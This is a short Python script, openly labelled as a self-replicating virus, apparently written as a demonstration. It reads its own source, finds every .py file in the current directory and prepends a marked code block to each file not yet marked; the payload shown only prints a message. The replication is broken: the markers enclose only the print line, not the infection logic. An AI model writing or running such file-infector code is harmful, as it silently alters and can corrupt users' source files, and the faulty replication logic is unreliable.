import sys
import glob

# 1. Capture the virus code from this current file
virus_code = []
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

# Marks the start and end of the virus code so it knows what to copy
self_replicating = False
for line in lines:
    if line == "# VIRUS START\n":
        self_replicating = True
    if self_replicating:
        virus_code.append(line)
    if line == "# VIRUS END\n":
        break

# 2. Find other python files to infect
# WARNING: This will modify all .py files in the current directory
target_files = glob.glob('*.py')

for file in target_files:
    with open(file, 'r') as f:
        content = f.readlines()
    
    # 3. Check if already infected
    infected = False
    for line in content:
        if line == "# VIRUS START\n":
            infected = True
            break
    
    # 4. Inject the code if not already present
    if not infected:
        new_content = []
        new_content.extend(virus_code)
        new_content.extend(content)
        with open(file, 'w') as f:
            f.writelines(new_content)

# VIRUS START
print("This file has been 'infected' by a self-replicating Python script.")
# VIRUS END
